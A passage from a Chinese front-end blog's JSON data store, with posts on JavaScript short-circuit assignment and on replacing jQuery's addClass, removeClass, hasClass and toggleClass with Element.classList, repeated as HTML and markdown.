js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span> || <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 1</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"进阶用法\"><a href=\"#进阶用法\" class=\"headerlink\" title=\"进阶用法\"></a>进阶用法</h3><p>使用 <code>&amp;&amp;</code> 的短路规则代替短线 <code>if</code> 判断进行快速赋值操作。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span> (<span class=\"params\">param</span>) </span>&#123;</span><br><span class=\"line\">    !param &amp;&amp; (param = &#123;&#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span> (<span class=\"params\">param</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!param) param = &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的写法 <code>1</code> 和 <code>2</code> 的实际效果完全相同。</p>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><h6 id=\"使用逻辑运算符代替短线-if-的优点\"><a href=\"#使用逻辑运算符代替短线-if-的优点\" class=\"headerlink\" title=\"使用逻辑运算符代替短线 if 的优点:\"></a>使用逻辑运算符代替短线 <code>if</code> 的优点:</h6><ol>\n<li>运行速度快；<code>javascript</code> 中，逻辑运算符的执行速度是比 <code>if</code> 语句要快(参考短线操作规则)。</li>\n<li>代码短小精悍，\b逼格更高(请忽略这点)。</li>\n</ol>\n<h6 id=\"使用逻辑运算符代替短线-if-的缺点\"><a href=\"#使用逻辑运算符代替短线-if-的缺点\" class=\"headerlink\" title=\"使用逻辑运算符代替短线 if 的缺点:\"></a>使用逻辑运算符代替短线 <code>if</code> 的缺点:</h6><ol>\n<li>执行速度是变快了，但是使用的时候必须要注意 <code>操作符优先级</code> 的问题(可以参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence\" target=\"_blank\" rel=\"noopener\">这里</a>)。</li>\n<li>逼格是更高的，但是代码的可读性变的很差，不了解的人看了之后完全不知道怎么理解。</li>\n</ol>\n<p>\b</p>"},{"title":"现代浏览器的类名操作","date":"2016-11-24T03:25:53.000Z","_content":"\n在前端 `MV*` 框架还未兴起的时期，绝大部分的前端网站都是基于 `事件驱动` 的。而这种网站总是不可避免的伴随着大量的 `DOM操作`。其中，`类名 - class` 的操作算是其中最平常也是最方便、通用的一种。\n\n<!-- more -->\n\n### 类名操作\n\n说起类名操作，大部分人的第一反应就是 `jquery` 中的 `addClass、removeClass、hasClass、toggleClass` 这几个组合了。\n下面我们看下 `jquery` 源码中是怎么实现的。\n#### addClass\n```js\n// addClass\nfunction addClass( value ) {\n    var classes, elem, cur, curValue, clazz, j, finalValue,\n        i = 0;\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( j ) {\n            jQuery( this ).addClass( value.call( this, j, getClass( this ) ) );\n        } );\n    }\n\n    if ( typeof value === \"string\" && value ) {\n        classes = value.match( rnothtmlwhite ) || [];\n\n        while ( ( elem = this[ i++ ] ) ) {\n            curValue = getClass( elem );\n            cur = elem.nodeType === 1 && ( \" \" + stripAndCollapse( curValue ) + \" \" );\n\n            if ( cur ) {\n                j = 0;\n                while ( ( clazz = classes[ j++ ] ) ) {\n                    if ( cur.indexOf( \" \" + clazz + \" \" ) < 0 ) {\n                        cur += clazz + \" \";\n                    }\n                }\n\n                // Only assign if different to avoid unneeded rendering.\n                finalValue = stripAndCollapse( cur );\n                if ( curValue !== finalValue ) {\n                    elem.setAttribute( \"class\", finalValue );\n                }\n            }\n        }\n    }\n\n    return this;\n}\n```\n\n#### removeClass\n```js\n// removeClass \nfunction removeClass( value ) {\n    var classes, elem, cur, curValue, clazz, j, finalValue,\n        i = 0;\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( j ) {\n            jQuery( this ).removeClass( value.call( this, j, getClass( this ) ) );\n        } );\n    }\n\n    if ( !arguments.length ) {\n        return this.attr( \"class\", \"\" );\n    }\n\n    if ( typeof value === \"string\" && value ) {\n        classes = value.match( rnothtmlwhite ) || [];\n\n        while ( ( elem = this[ i++ ] ) ) {\n            curValue = getClass( elem );\n\n            // This expression is here for better compressibility (see addClass)\n            cur = elem.nodeType === 1 && ( \" \" + stripAndCollapse( curValue ) + \" \" );\n\n            if ( cur ) {\n                j = 0;\n                while ( ( clazz = classes[ j++ ] ) ) {\n\n                    // Remove *all* instances\n                    while ( cur.indexOf( \" \" + clazz + \" \" ) > -1 ) {\n                        cur = cur.replace( \" \" + clazz + \" \", \" \" );\n                    }\n                }\n\n                // Only assign if different to avoid unneeded rendering.\n                finalValue = stripAndCollapse( cur );\n                if ( curValue !== finalValue ) {\n                    elem.setAttribute( \"class\", finalValue );\n                }\n            }\n        }\n    }\n\n    return this;\n}\n```\n#### hasClass\n```js\n// hasClass\nfunction hasClass( selector ) {\n    var className, elem,\n        i = 0;\n\n    className = \" \" + selector + \" \";\n    while ( ( elem = this[ i++ ] ) ) {\n        if ( elem.nodeType === 1 &&\n            ( \" \" + stripAndCollapse( getClass( elem ) ) + \" \" ).indexOf( className ) > -1 ) {\n                return true;\n        }\n    }\n\n    return false;\n}\n```\n\n#### toggleClass\n```js\n// toggleClass \nfunction toggleClass( value, stateVal ) {\n    var type = typeof value;\n\n    if ( typeof stateVal === \"boolean\" && type === \"string\" ) {\n        return stateVal ? this.addClass( value ) : this.removeClass( value );\n    }\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( i ) {\n            jQuery( this ).toggleClass(\n                value.call( this, i, getClass( this ), stateVal ),\n                stateVal\n            );\n        } );\n    }\n\n    return this.each( function() {\n        var className, i, self, classNames;\n\n        if ( type === \"string\" ) {\n\n            // Toggle individual class names\n            i = 0;\n            self = jQuery( this );\n            classNames = value.match( rnothtmlwhite ) || [];\n\n            while ( ( className = classNames[ i++ ] ) ) {\n\n                // Check each className given, space separated list\n                if ( self.hasClass( className ) ) {\n                    self.removeClass( className );\n                } else {\n                    self.addClass( className );\n                }\n            }\n\n        // Toggle whole class name\n        } else if ( value === undefined || type === \"boolean\" ) {\n            className = getClass( this );\n            if ( className ) {\n\n                // Store className if set\n                dataPriv.set( this, \"__className__\", className );\n            }\n\n            // If the element has a class name or if we're passed `false`,\n            // then remove the whole classname (if there was one, the above saved it).\n            // Otherwise bring back whatever was previously saved (if anything),\n            // falling back to the empty string if nothing was stored.\n            if ( this.setAttribute ) {\n                this.setAttribute( \"class\",\n                    className || value === false ?\n                    \"\" :\n                    dataPriv.get( this, \"__className__\" ) || \"\"\n                );\n            }\n        }\n    } );\n}\n```\n\n内部的代码逻辑我就不再分析了，这种代码最明显的特点：`大量的循环和判断`。\n对于以前的前端环境来说，这种写法无可厚非，它能让我们的代码更加的健壮，能兼容几乎所有的浏览器环境了。但是如今，随着 `大前端` 的兴起，浏览器对于 `js - css - html` 的支持能力已经发生了翻天覆地的变化，我们可以用最简单、快速的方式实现上面的操作。\n\n### Element.classList\n我们先看下官方对于该属性的介绍：\n> Element.classList 是一个只读属性，返回一个元素的类属性的实时 DOMTokenList集合。\n使用 classList 是一个方便的替代方法，通过element.className作为空格分隔的字符串访问元素的类列表。\n\n更加通俗的讲：\n之前我们获取一个元素类名的集合时，需要先使用 `element.className` 获取类名的字符串，之后在 `split` 成一个集合。而使用 `element.classList` 时，我们能直接获取元素类名的集合(**这里是集合，不是数组**)。\n\n### Element.classList 的类名操作\n\n上面说到，`element.classList` 返回一个类名的集合，该集合是与元素的 `class` 相互映射的。也就是说，我们只要向 `classList` 中添加一个 `class` 这个 `class` 就会映射到真实的元素上。为此`DOMTokenList` 提供了一套操作的方法来允许开发者操作 `classList`。\n\n#### addClass - classList.add\n```js\n// 添加类名\nelement.classList.add('added-class')\n```\n\n#### removeClass - classList.remove\n```js\n// 删除类名\nelement.classList.remove('removed-class')\n```\n\n#### hasClass - classList.contains\n```js\n// 判断是否存在类名\nelement.classList.contains('contains-class')\n```\n#### toggleClass - classList.toggle\n```js\n// 类名切换\nelement.classList.toggle('toggled-class')\n\n// 类名切换 - while\n// 当第二个参数的表达式满足条件时，执行 toggle 操作\n// 该方法目前还在 **实验** 阶段\nelement.classList.toggle('toggled-class', i < 10)\n```\n\n上面列举的这些方法已经在 `ie10` 以上的浏览器上普及，可以直接使用。\n更多 `classList` 的方法可以参考[这里](https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList)。","source":"_posts/现代浏览器的类名操作.md","raw":"---\ntitle: 现代浏览器的类名操作\ndate: 2016-11-24 11:25:53\ntags:\n---\n\n在前端 `MV*` 框架还未兴起的时期，绝大部分的前端网站都是基于 `事件驱动` 的。而这种网站总是不可避免的伴随着大量的 `DOM操作`。其中，`类名 - class` 的操作算是其中最平常也是最方便、通用的一种。\n\n<!-- more -->\n\n### 类名操作\n\n说起类名操作，大部分人的第一反应就是 `jquery` 中的 `addClass、removeClass、hasClass、toggleClass` 这几个组合了。\n下面我们看下 `jquery` 源码中是怎么实现的。\n#### addClass\n```js\n// addClass\nfunction addClass( value ) {\n    var classes, elem, cur, curValue, clazz, j, finalValue,\n        i = 0;\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( j ) {\n            jQuery( this ).addClass( value.call( this, j, getClass( this ) ) );\n        } );\n    }\n\n    if ( typeof value === \"string\" && value ) {\n        classes = value.match( rnothtmlwhite ) || [];\n\n        while ( ( elem = this[ i++ ] ) ) {\n            curValue = getClass( elem );\n            cur = elem.nodeType === 1 && ( \" \" + stripAndCollapse( curValue ) + \" \" );\n\n            if ( cur ) {\n                j = 0;\n                while ( ( clazz = classes[ j++ ] ) ) {\n                    if ( cur.indexOf( \" \" + clazz + \" \" ) < 0 ) {\n                        cur += clazz + \" \";\n                    }\n                }\n\n                // Only assign if different to avoid unneeded rendering.\n                finalValue = stripAndCollapse( cur );\n                if ( curValue !== finalValue ) {\n                    elem.setAttribute( \"class\", finalValue );\n                }\n            }\n        }\n    }\n\n    return this;\n}\n```\n\n#### removeClass\n```js\n// removeClass \nfunction removeClass( value ) {\n    var classes, elem, cur, curValue, clazz, j, finalValue,\n        i = 0;\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( j ) {\n            jQuery( this ).removeClass( value.call( this, j, getClass( this ) ) );\n        } );\n    }\n\n    if ( !arguments.length ) {\n        return this.attr( \"class\", \"\" );\n    }\n\n    if ( typeof value === \"string\" && value ) {\n        classes = value.match( rnothtmlwhite ) || [];\n\n        while ( ( elem = this[ i++ ] ) ) {\n            curValue = getClass( elem );\n\n            // This expression is here for better compressibility (see addClass)\n            cur = elem.nodeType === 1 && ( \" \" + stripAndCollapse( curValue ) + \" \" );\n\n            if ( cur ) {\n                j = 0;\n                while ( ( clazz = classes[ j++ ] ) ) {\n\n                    // Remove *all* instances\n                    while ( cur.indexOf( \" \" + clazz + \" \" ) > -1 ) {\n                        cur = cur.replace( \" \" + clazz + \" \", \" \" );\n                    }\n                }\n\n                // Only assign if different to avoid unneeded rendering.\n                finalValue = stripAndCollapse( cur );\n                if ( curValue !== finalValue ) {\n                    elem.setAttribute( \"class\", finalValue );\n                }\n            }\n        }\n    }\n\n    return this;\n}\n```\n#### hasClass\n```js\n// hasClass\nfunction hasClass( selector ) {\n    var className, elem,\n        i = 0;\n\n    className = \" \" + selector + \" \";\n    while ( ( elem = this[ i++ ] ) ) {\n        if ( elem.nodeType === 1 &&\n            ( \" \" + stripAndCollapse( getClass( elem ) ) + \" \" ).indexOf( className ) > -1 ) {\n                return true;\n        }\n    }\n\n    return false;\n}\n```\n\n#### toggleClass\n```js\n// toggleClass \nfunction toggleClass( value, stateVal ) {\n    var type = typeof value;\n\n    if ( typeof stateVal === \"boolean\" && type === \"string\" ) {\n        return stateVal ? this.addClass( value ) : this.removeClass( value );\n    }\n\n    if ( jQuery.isFunction( value ) ) {\n        return this.each( function( i ) {\n            jQuery( this ).toggleClass(\n                value.call( this, i, getClass( this ), stateVal ),\n                stateVal\n            );\n        } );\n    }\n\n    return this.each( function() {\n        var className, i, self, classNames;\n\n        if ( type === \"string\" ) {\n\n            // Toggle individual class names\n            i = 0;\n            self = jQuery( this );\n            classNames = value.match( rnothtmlwhite ) || [];\n\n            while ( ( className = classNames[ i++ ] ) ) {\n\n                // Check each className given, space separated list\n                if ( self.hasClass( className ) ) {\n                    self.removeClass( className );\n                } else {\n                    self.addClass( className );\n                }\n            }\n\n        // Toggle whole class name\n        } else if ( value === undefined || type === \"boolean\" ) {\n            className = getClass( this );\n            if ( className ) {\n\n                // Store className if set\n                dataPriv.set( this, \"__className__\", className );\n            }\n\n            // If the element has a class name or if we're passed `false`,\n            // then remove the whole classname (if there was one, the above saved it).\n            // Otherwise bring back whatever was previously saved (if anything),\n            // falling back to the empty string if nothing was stored.\n            if ( this.setAttribute ) {\n                this.setAttribute( \"class\",\n                    className || value === false ?\n                    \"\" :\n                    dataPriv.get( this, \"__className__\" ) || \"\"\n                );\n            }\n        }\n    } );\n}\n```\n\n内部的代码逻辑我就不再分析了，这种代码最明显的特点：`大量的循环和判断`。\n对于以前的前端环境来说，这种写法无可厚非，它能让我们的代码更加的健壮，能兼容几乎所有的浏览器环境了。但是如今，随着 `大前端` 的兴起，浏览器对于 `js - css - html` 的支持能力已经发生了翻天覆地的变化，我们可以用最简单、快速的方式实现上面的操作。\n\n### Element.classList\n我们先看下官方对于该属性的介绍：\n> Element.classList 是一个只读属性，返回一个元素的类属性的实时 DOMTokenList集合。\n使用 classList 是一个方便的替代方法，通过element.className作为空格分隔的字符串访问元素的类列表。\n\n更加通俗的讲：\n之前我们获取一个元素类名的集合时，需要先使用 `element.className` 获取类名的字符串，之后在 `split` 成一个集合。而使用 `element.classList` 时，我们能直接获取元素类名的集合(**这里是集合，不是数组**)。\n\n### Element.classList 的类名操作\n\n上面说到，`element.classList` 返回一个类名的集合，该集合是与元素的 `class` 相互映射的。也就是说，我们只要向 `classList` 中添加一个 `class` 这个 `class` 就会映射到真实的元素上。为此`DOMTokenList` 提供了一套操作的方法来允许开发者操作 `classList`。\n\n#### addClass - classList.add\n```js\n// 添加类名\nelement.classList.add('added-class')\n```\n\n#### removeClass - classList.remove\n```js\n// 删除类名\nelement.classList.remove('removed-class')\n```\n\n#### hasClass - classList.contains\n```js\n// 判断是否存在类名\nelement.classList.contains('contains-class')\n```\n#### toggleClass - classList.toggle\n```js\n// 类名切换\nelement.classList.toggle('toggled-class')\n\n// 类名切换 - while\n// 当第二个参数的表达式满足条件时，执行 toggle 操作\n// 该方法目前还在 **实验** 阶段\nelement.classList.toggle('toggled-class', i < 10)\n```\n\n上面列举的这些方法已经在 `ie10` 以上的浏览器上普及，可以直接使用。\n更多 `classList` 的方法可以参考[这里](https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList)。","slug":"现代浏览器的类名操作","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qy000l02vsgsufi34a","content":"<p>在前端 <code>MV*</code> 框架还未兴起的时期，绝大部分的前端网站都是基于 <code>事件驱动</code> 的。而这种网站总是不可避免的伴随着大量的 <code>DOM操作</code>。其中，<code>类名 - class</code> 的操作算是其中最平常也是最方便、通用的一种。</p>\n<a id=\"more\"></a>\n<h3 id=\"类名操作\"><a href=\"#类名操作\" class=\"headerlink\" title=\"类名操作\"></a>类名操作</h3><p>说起类名操作，大部分人的第一反应就是 <code>jquery</code> 中的 <code>addClass、removeClass、hasClass、toggleClass</code> 这几个组合了。<br>下面我们看下 <code>jquery</code> 源码中是怎么实现的。</p>\n<h4 id=\"addClass\"><a href=\"#addClass\" class=\"headerlink\" title=\"addClass\"></a>addClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// addClass</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addClass</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> j </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).addClass( value.call( <span class=\"keyword\">this</span>, j, getClass( <span class=\"keyword\">this</span> ) ) );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> value === <span class=\"string\">\"string\"</span> &amp;&amp; value ) &#123;</span><br><span class=\"line\">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">            curValue = getClass( elem );</span><br><span class=\"line\">            cur = elem.nodeType === <span class=\"number\">1</span> &amp;&amp; ( <span class=\"string\">\" \"</span> + stripAndCollapse( curValue ) + <span class=\"string\">\" \"</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cur ) &#123;</span><br><span class=\"line\">                j = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ( cur.indexOf( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span> ) &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">                        cur += clazz + <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Only assign if different to avoid unneeded rendering.</span></span><br><span class=\"line\">                finalValue = stripAndCollapse( cur );</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( curValue !== finalValue ) &#123;</span><br><span class=\"line\">                    elem.setAttribute( <span class=\"string\">\"class\"</span>, finalValue );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"removeClass\"><a href=\"#removeClass\" class=\"headerlink\" title=\"removeClass\"></a>removeClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// removeClass </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">removeClass</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> j </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).removeClass( value.call( <span class=\"keyword\">this</span>, j, getClass( <span class=\"keyword\">this</span> ) ) );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">arguments</span>.length ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.attr( <span class=\"string\">\"class\"</span>, <span class=\"string\">\"\"</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> value === <span class=\"string\">\"string\"</span> &amp;&amp; value ) &#123;</span><br><span class=\"line\">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">            curValue = getClass( elem );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// This expression is here for better compressibility (see addClass)</span></span><br><span class=\"line\">            cur = elem.nodeType === <span class=\"number\">1</span> &amp;&amp; ( <span class=\"string\">\" \"</span> + stripAndCollapse( curValue ) + <span class=\"string\">\" \"</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cur ) &#123;</span><br><span class=\"line\">                j = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// Remove *all* instances</span></span><br><span class=\"line\">                    <span class=\"keyword\">while</span> ( cur.indexOf( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span> ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">                        cur = cur.replace( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span>, <span class=\"string\">\" \"</span> );</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Only assign if different to avoid unneeded rendering.</span></span><br><span class=\"line\">                finalValue = stripAndCollapse( cur );</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( curValue !== finalValue ) &#123;</span><br><span class=\"line\">                    elem.setAttribute( <span class=\"string\">\"class\"</span>, finalValue );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"hasClass\"><a href=\"#hasClass\" class=\"headerlink\" title=\"hasClass\"></a>hasClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// hasClass</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasClass</span>(<span class=\"params\"> selector </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> className, elem,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    className = <span class=\"string\">\" \"</span> + selector + <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( elem.nodeType === <span class=\"number\">1</span> &amp;&amp;</span><br><span class=\"line\">            ( <span class=\"string\">\" \"</span> + stripAndCollapse( getClass( elem ) ) + <span class=\"string\">\" \"</span> ).indexOf( className ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"toggleClass\"><a href=\"#toggleClass\" class=\"headerlink\" title=\"toggleClass\"></a>toggleClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// toggleClass </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">toggleClass</span>(<span class=\"params\"> value, stateVal </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> type = <span 